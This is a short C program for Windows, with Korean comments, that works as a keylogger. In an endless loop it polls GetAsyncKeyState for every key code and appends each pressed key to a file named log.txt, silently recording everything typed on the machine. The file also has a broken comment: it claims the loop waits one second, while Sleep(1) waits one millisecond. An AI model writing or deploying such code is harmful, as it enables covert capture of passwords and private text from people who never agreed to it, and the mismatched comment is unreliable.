#include <stdio.h>
#include <windows.h>

int main() {
    while (1) {
        // 1초 대기
        Sleep(1);  // 1000ms == 1초
        
        // 키 입력 확인
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {  // 0x8000 비트는 키가 눌렸을 때
                FILE *file = fopen("log.txt", "a");
                if (file != NULL) {
                    fprintf(file, "%c\n", key);
                    fclose(file);
                }
            }
        }
    }
    return 0;
}
